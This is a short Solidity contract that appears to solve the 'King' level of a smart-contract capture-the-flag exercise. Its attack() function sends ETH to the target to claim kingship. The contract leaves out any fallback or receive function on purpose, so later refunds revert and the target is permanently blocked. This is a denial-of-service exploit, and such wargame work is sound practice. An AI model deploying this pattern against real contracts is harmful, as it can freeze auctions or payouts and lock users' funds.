// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../interfaces/king.sol";

/**
 * contract without fallback function, however with a payable function to be able so send ETH into it
 */
contract kingAttack {

    address payable public target;
    // King public immutable target;
    constructor(address payable targetAddress) {
        target=targetAddress;
    }

// payable function to send the received eth to the target contract and become the new king!
    function attack() payable external {
        target.call{value: msg.value}('');
    }

// no fallback function so the contract will not receive ETH by transfer()
}
